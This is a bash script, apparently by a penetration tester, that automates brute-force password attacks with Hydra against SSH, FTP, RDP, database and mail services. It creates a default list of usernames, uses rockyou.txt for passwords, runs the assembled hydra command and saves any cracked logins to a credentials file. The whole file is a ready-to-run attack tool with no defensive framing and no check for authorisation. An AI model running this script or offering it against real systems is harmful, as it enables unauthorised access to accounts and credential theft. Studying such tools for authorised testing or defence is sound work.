#!/bin/bash
# Automated Brute Force Script with Hydra
# Author: Thierry Braga

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Banner
echo -e "${RED}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║              HYDRA BRUTE FORCE AUTOMATION                 ║
║              Multi-Service Password Cracker               ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

# Default wordlists
DEFAULT_USER_LIST="/root/wordlists/metasploit/unix_users.txt"
DEFAULT_PASS_LIST="/root/wordlists/rockyou.txt"
CUSTOM_USER_LIST="/root/wordlists/common_users.txt"

# Create custom user list if doesn't exist
if [ ! -f "$CUSTOM_USER_LIST" ]; then
    cat > "$CUSTOM_USER_LIST" << USERS
root
admin
administrator
user
test
guest
mysql
postgres
oracle
tomcat
jenkins
apache
www-data
ftp
USERS
fi

# Check arguments
if [ $# -lt 2 ]; then
    echo -e "${YELLOW}Usage: $0 <target> <service> [options]${NC}"
    echo ""
    echo "Services supported:"
    echo "  ssh, ftp, telnet, http-get, http-post-form,"
    echo "  mysql, postgres, mssql, rdp, vnc, smtp, pop3, imap"
    echo ""
    echo "Options:"
    echo "  -u <username>       Single username"
    echo "  -U <user_list>      Username wordlist"
    echo "  -p <password>       Single password"
    echo "  -P <pass_list>      Password wordlist"
    echo "  -s <port>           Custom port"
    echo "  -t <threads>        Number of threads (default: 16)"
    echo "  -o <output_file>    Output file"
    echo ""
    echo "Examples:"
    echo "  $0 192.168.1.100 ssh -u root"
    echo "  $0 example.com ftp -U users.txt -P passwords.txt"
    echo "  $0 192.168.1.50 mysql -u admin -s 3307"
    exit 1
fi

TARGET=$1
SERVICE=$2
shift 2

# Default options
USERNAME=""
USERLIST=""
PASSWORD=""
PASSLIST=""
PORT=""
THREADS=16
OUTPUT_FILE="/root/reports/hydra_${TARGET}_${SERVICE}_$(date +%Y%m%d_%H%M%S).txt"

# Parse options
while getopts "u:U:p:P:s:t:o:" opt; do
    case $opt in
        u) USERNAME=$OPTARG ;;
        U) USERLIST=$OPTARG ;;
        p) PASSWORD=$OPTARG ;;
        P) PASSLIST=$OPTARG ;;
        s) PORT=$OPTARG ;;
        t) THREADS=$OPTARG ;;
        o) OUTPUT_FILE=$OPTARG ;;
        \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
    esac
done

# Set defaults if not specified
if [ -z "$USERLIST" ] && [ -z "$USERNAME" ]; then
    USERLIST=$CUSTOM_USER_LIST
    echo -e "${YELLOW}[!] No user specified, using default list: $USERLIST${NC}"
fi

if [ -z "$PASSLIST" ] && [ -z "$PASSWORD" ]; then
    PASSLIST=$DEFAULT_PASS_LIST
    echo -e "${YELLOW}[!] No password specified, using default list: $PASSLIST${NC}"
fi

# Build hydra command
HYDRA_CMD="hydra"

# Add user options
if [ -n "$USERNAME" ]; then
    HYDRA_CMD="$HYDRA_CMD -l $USERNAME"
elif [ -n "$USERLIST" ]; then
    HYDRA_CMD="$HYDRA_CMD -L $USERLIST"
fi

# Add password options
if [ -n "$PASSWORD" ]; then
    HYDRA_CMD="$HYDRA_CMD -p $PASSWORD"
elif [ -n "$PASSLIST" ]; then
    HYDRA_CMD="$HYDRA_CMD -P $PASSLIST"
fi

# Add other options
HYDRA_CMD="$HYDRA_CMD -t $THREADS"
HYDRA_CMD="$HYDRA_CMD -vV"
HYDRA_CMD="$HYDRA_CMD -o $OUTPUT_FILE"

if [ -n "$PORT" ]; then
    HYDRA_CMD="$HYDRA_CMD -s $PORT"
fi

# Add target and service
HYDRA_CMD="$HYDRA_CMD $TARGET $SERVICE"

# Display attack info
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           ATTACK CONFIGURATION                            ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}Target:${NC}    $TARGET"
echo -e "${GREEN}Service:${NC}   $SERVICE"
if [ -n "$PORT" ]; then
    echo -e "${GREEN}Port:${NC}      $PORT"
fi
echo -e "${GREEN}Threads:${NC}   $THREADS"
echo ""

if [ -n "$USERNAME" ]; then
    echo -e "${GREEN}Username:${NC}  $USERNAME"
else
    echo -e "${GREEN}Userlist:${NC}  $USERLIST ($(wc -l < $USERLIST 2>/dev/null || echo 0) users)"
fi

if [ -n "$PASSWORD" ]; then
    echo -e "${GREEN}Password:${NC}  $PASSWORD"
else
    echo -e "${GREEN}Passlist:${NC}  $PASSLIST ($(wc -l < $PASSLIST 2>/dev/null || echo 0) passwords)"
fi

echo ""
read -p "Press ENTER to start the attack or Ctrl+C to cancel..."
echo ""

# Start attack
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           ATTACK IN PROGRESS                              ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}[+] Command: $HYDRA_CMD${NC}"
echo ""

START_TIME=$(date +%s)

# Execute hydra
eval $HYDRA_CMD

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

# Results
echo ""
echo -e "${BLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║           ATTACK COMPLETED                                ║${NC}"
echo -e "${BLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}Duration:${NC}  $DURATION seconds"
echo -e "${GREEN}Output:${NC}    $OUTPUT_FILE"
echo ""

# Check for successful logins
if grep -q "login:" "$OUTPUT_FILE" 2>/dev/null; then
    echo -e "${GREEN}[+] CREDENTIALS FOUND!${NC}"
    echo ""
    grep "login:" "$OUTPUT_FILE" | while read line; do
        echo -e "${GREEN}  $line${NC}"
    done
    echo ""
    
    # Extract credentials to separate file
    CREDS_FILE="${OUTPUT_FILE%.txt}_credentials.txt"
    grep "login:" "$OUTPUT_FILE" > "$CREDS_FILE"
    echo -e "${GREEN}[+] Credentials saved to: $CREDS_FILE${NC}"
else
    echo -e "${RED}[-] No valid credentials found${NC}"
fi

echo ""
echo -e "${BLUE}[*] Full results: cat $OUTPUT_FILE${NC}"
echo ""
